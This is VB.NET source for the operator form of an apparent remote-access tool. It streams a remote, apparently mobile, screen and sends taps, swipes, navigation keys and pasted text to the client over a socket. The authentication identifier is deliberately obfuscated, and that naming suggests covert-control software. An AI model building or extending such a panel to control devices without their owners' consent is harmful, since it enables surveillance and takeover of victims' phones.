Imports System.Runtime.InteropServices
Imports System.Text

Public Class Frm_VNC

    Public Client As Net.Sockets.TcpClient

    Public classClient As sockets.Frm_Config_Client

    Public DownloadsFolder As String

    Public ScreenSize As Size

    Public Title As String = "null"



    Private Sub Button1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub ScreenShoter_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Qualtibox.Text = "90"
        Me.FPSBOX.Text = "30"

        If Me.classClient IsNot Nothing Then
            Try
                Dim spl As String() = classClient.Keys.Split(":")
                Dim objs As Object() = {Client, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "sc:" & "on:" & Qualtibox.Text & "~" & FPSBOX.Text & "~" & classClient.ClientRemoteAddress & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                classClient.SendAsync(objs)
                StartButton.Enabled = False
                StopButton.Enabled = True
                vewpnl.Enabled = True
                PictureBox1.Enabled = True
            Catch ex As Exception
            End Try
        End If

    End Sub

    Private Sub Button1_Click_1(sender As Object, e As EventArgs)
        If Me.classClient IsNot Nothing Then
            Try


                Dim spl As String() = classClient.Keys.Split(":")
                Dim objs As Object() = {Client, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "sp<*>" & "U" & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}

                classClient.SendAsync(objs)

            Catch ex As Exception

            End Try
        End If
    End Sub

    Private Sub Button2_Click_1(sender As Object, e As EventArgs)
        If Me.classClient IsNot Nothing Then
            Try


                Dim spl As String() = classClient.Keys.Split(":")
                Dim objs As Object() = {Client, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "sp<*>" & "D" & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}

                classClient.SendAsync(objs)

            Catch ex As Exception

            End Try
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs)
        If Me.classClient IsNot Nothing Then
            Try


                Dim spl As String() = classClient.Keys.Split(":")
                Dim objs As Object() = {Client, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "sp<*>" & "L" & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}

                classClient.SendAsync(objs)

            Catch ex As Exception

            End Try
        End If
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs)
        If Me.classClient IsNot Nothing Then
            Try


                Dim spl As String() = classClient.Keys.Split(":")
                Dim objs As Object() = {Client, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "sp<*>" & "R" & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}

                classClient.SendAsync(objs)

            Catch ex As Exception

            End Try
        End If
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs)

    End Sub

    Private Swaping As Boolean = False
    Private isup As Integer = False
    Private isdown As Integer = False
    Private isleft As Integer = False
    Private isright As Integer = False
    Private Trakpoint As List(Of Point)
    Private Sub PictureBox1_MouseDown(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseDown

        If e.Button = MouseButtons.Left Then
            Trakpoint = New List(Of Point)
            Trakpoint.Add(New Point(e.X, e.Y))

            isclick = False
            isdown = True




        Else
            presstimer.Enabled = True

            isclick = True

        End If




    End Sub
    Public mouseDownPoint As Point
    Public mouseUpPoint As Point

    Private Sub SendSwep()

        Dim str As String = Getmax(New Integer() {isup, isdown, isleft, isright})

        If str IsNot "" Then
            isup = 0
            isdown = 0
            isleft = 0
            isright = 0
            Dim spl As String() = classClient.Keys.Split(":")
            Dim objs As Object() = {Client, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "sp<*>" & str & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}

            classClient.SendAsync(objs)
        End If









































































    End Sub

    Private Function Getmax(v() As Integer) As String

        Dim max As Integer = 0
        For Each num In v
            If num > max Then
                max = num
            End If
        Next
        If max = isup Then

            Return "U"
        ElseIf max = isdown Then

            Return "D"
        ElseIf max = isleft Then

            Return "L"
        ElseIf max = isright Then

            Return "R"
        End If
        Return ""
    End Function

    Private Sub PictureBox1_MouseUp(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseUp
        isdown = False
        Dim currentW As Integer = PictureBox1.Width
        Dim currentH As Integer = PictureBox1.Height
        If Not isclick Then


            If Swaping Then
                Swaping = False


                Trakpoint.Add(New Point(e.X, e.Y))

                Dim stringb As New StringBuilder

                For Each p As Point In Trakpoint
                    Dim point As New Point(CInt(Math.Round(CDbl((p.X * (CDbl(ScreenSize.Width) / CDbl(currentW)))))), CInt(Math.Round(CDbl((p.Y * (CDbl(ScreenSize.Height) / CDbl(currentH)))))))
                    stringb.Append(point.ToString + ":")
                Next

                Dim spl As String() = classClient.Keys.Split(":")
                Dim objs As Object() = {Client, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "sp<*>" & stringb.ToString & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}

                classClient.SendAsync(objs)

            End If





        Else
            presstimer.Enabled = False
            presstimer.Stop()
            Dim Commandmove As String = "clk:"
            If tiks > 3 Then
                Commandmove = "clk:hold:"
            End If
            tiks = 0
            Dim thpoint As Point = PictureBox1.PointToClient(MousePosition)


            If ScreenSize = Nothing Then


                ScreenSize = New Size("1220", "1280")

            End If
            Dim point As New Point(CInt(Math.Round(CDbl((thpoint.X * (CDbl(ScreenSize.Width) / CDbl(currentW)))))), CInt(Math.Round(CDbl((thpoint.Y * (CDbl(ScreenSize.Height) / CDbl(currentH)))))))
            Commandmove = Commandmove + (point.X).ToString + ":" + (point.Y).ToString
            Dim spl As String() = classClient.Keys.Split(":")
            Dim objs As Object() = {Client, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "sp<*>" & Commandmove & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
            classClient.SendAsync(objs)
        End If


    End Sub

    Private Sub PictureBox1_MouseMove(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseMove
        If isdown Then
            Swaping = True
            isclick = False
            Trakpoint.Add(New Point(e.X, e.Y))
        End If
    End Sub



    Private isclick As Boolean = False

    Private Sub Button1_Click_2(sender As Object, e As EventArgs)





    End Sub

    Private Sub Enterbutton_Click(sender As Object, e As EventArgs)
        If classClient IsNot Nothing AndAlso textsend.Text.Length > 0 Then
            Dim chk0, chk1 As Integer

            chk0 = 0

            chk1 = 0


            Dim objs As Object() = {classClient.myClient, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "pst<*>" & textsend.Text & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(chk0) & sockets.Data.SPL_SOCKET & CStr(chk1) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}

            classClient.SendAsync(objs)
            textsend.Text = ""
        End If
    End Sub

    Private Sub Autosave_CheckedChanged(sender As Object)

    End Sub
    Public Const WM_NCLBUTTONDOWN As Integer = &HA1
    Public Const HT_CAPTION As Integer = &H2
    <DllImportAttribute("user32.dll")>
    Public Shared Function SendMessage(ByVal hWnd As IntPtr, ByVal Msg As Integer, ByVal wParam As Integer, ByVal lParam As Integer) As Integer
    End Function

    <DllImportAttribute("user32.dll")>
    Public Shared Function ReleaseCapture() As Boolean
    End Function
    Private Sub Panel2_MouseDown(sender As Object, e As MouseEventArgs) Handles Panel2.MouseDown
        If e.Button = Windows.Forms.MouseButtons.Left Then
            ReleaseCapture()
            SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0)
        End If
    End Sub

    Private Sub Panel3_MouseDown(sender As Object, e As MouseEventArgs)
        If e.Button = Windows.Forms.MouseButtons.Left Then
            ReleaseCapture()
            SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0)
        End If
    End Sub

    Private Sub Panel4_MouseDown(sender As Object, e As MouseEventArgs)
        If e.Button = Windows.Forms.MouseButtons.Left Then
            ReleaseCapture()
            SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0)
        End If
    End Sub

    Private Sub Button1_Click_3(sender As Object, e As EventArgs)
        Me.Close()
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click

    End Sub

    Private tiks As Integer = 0
    Private Sub Presstimer_Tick(sender As Object, e As EventArgs) Handles presstimer.Tick
        tiks += 1
    End Sub

    Private Sub Panel2_Paint(sender As Object, e As PaintEventArgs) Handles Panel2.Paint

    End Sub

    Private Sub StartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartButton.Click
        If Me.classClient IsNot Nothing Then
            Try



                Dim spl As String() = classClient.Keys.Split(":")



                Dim objs As Object() = {Client, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "sc:" & "on:" & Qualtibox.Text & "~" & FPSBOX.Text & "~" & classClient.ClientRemoteAddress & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}

                classClient.SendAsync(objs)





                StartButton.Enabled = False
                StopButton.Enabled = True

                vewpnl.Enabled = True
                PictureBox1.Enabled = True




            Catch ex As Exception

            End Try
        End If
    End Sub

    Private Sub StopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StopButton.Click
        If Me.classClient IsNot Nothing Then
            Try



                Dim spl As String() = classClient.Keys.Split(":")



                Dim objs As Object() = {Client, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "sc:" & "off" & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}


                classClient.SendAsync(objs)
                StartButton.Enabled = True
                StopButton.Enabled = False

                vewpnl.Enabled = False
                PictureBox1.Enabled = False



            Catch ex As Exception

            End Try
        End If
    End Sub

    Private Sub RecordToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RecordToolStripMenuItem.Click
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs)
    End Sub

    Private Sub Qualtibox_SelectedIndexChanged(sender As Object, e As EventArgs) Handles Qualtibox.SelectedIndexChanged

    End Sub

    Private Sub Guna2Button1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button1_Click_1(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button1_Click_2(sender As Object, e As EventArgs)

    End Sub

    Private Sub textsend_TextChanged(sender As Object, e As EventArgs) Handles textsend.TextChanged

    End Sub

    Private Sub Button1_Click_4(sender As Object, e As EventArgs)

    End Sub

    Private Sub vewpnl_Paint(sender As Object, e As PaintEventArgs) Handles vewpnl.Paint

    End Sub

    Private Sub Guna2GradientPanel1_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub Guna2Button2_Click(sender As Object, e As EventArgs) Handles Guna2Button2.Click
        If Me.classClient IsNot Nothing Then
            Try


                Dim spl As String() = classClient.Keys.Split(":")
                Dim objs As Object() = {Client, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "sp<*>" & "Ho" & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}

                classClient.SendAsync(objs)

            Catch ex As Exception

            End Try
        End If
    End Sub

    Private Sub Guna2GradientPanel4_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub Guna2Button1_Click_3(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button10_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button5_Click(sender As Object, e As EventArgs)
    End Sub

    Private Sub Guna2Button6_Click(sender As Object, e As EventArgs)
    End Sub

    Private Sub Guna2Button8_Click(sender As Object, e As EventArgs) Handles Guna2Button8.Click
        If classClient IsNot Nothing AndAlso textsend.Text.Length > 0 Then
            Dim chk0, chk1 As Integer

            chk0 = 0

            chk1 = 0


            Dim objs As Object() = {classClient.myClient, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "pst<*>" & textsend.Text & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(chk0) & sockets.Data.SPL_SOCKET & CStr(chk1) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}

            classClient.SendAsync(objs)
            textsend.Text = ""
        End If
    End Sub

    Private Sub Button1_Click_5(sender As Object, e As EventArgs) Handles Button1.Click

    End Sub

    Private Sub Guna2Button3_Click(sender As Object, e As EventArgs) Handles Guna2Button3.Click
        If Me.classClient IsNot Nothing Then
            Try


                Dim spl As String() = classClient.Keys.Split(":")
                Dim objs As Object() = {Client, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "sp<*>" & "RC" & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}

                classClient.SendAsync(objs)

            Catch ex As Exception

            End Try
        End If
    End Sub

    Private Sub Guna2Button4_Click(sender As Object, e As EventArgs) Handles Guna2Button4.Click
        If Me.classClient IsNot Nothing Then
            Try
                Dim spl As String() = classClient.Keys.Split(":")
                Dim objs As Object() = {Client, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "sp<*>" & "Bc" & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}

                classClient.SendAsync(objs)

            Catch ex As Exception

            End Try
        End If
    End Sub

    Private Sub Guna2CirclePictureBox1_Click(sender As Object, e As EventArgs) Handles Guna2CirclePictureBox1.Click
        Me.Close()
    End Sub

    Private Sub Guna2PictureBox5_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2PictureBox47_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Label3_Click(sender As Object, e As EventArgs)
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub PainelScreenLive_Paint(sender As Object, e As PaintEventArgs) Handles PainelScreenLive.Paint

    End Sub

    Private Sub Guna2PictureBox58_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox58.Click

    End Sub

    Private Sub Label16_Click(sender As Object, e As EventArgs) Handles Label16.Click

    End Sub

    Private Sub Guna2PictureBox4_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox4.Click

    End Sub

    Private Sub Guna2Panel1_Paint(sender As Object, e As PaintEventArgs) Handles Guna2Panel1.Paint

    End Sub
End Class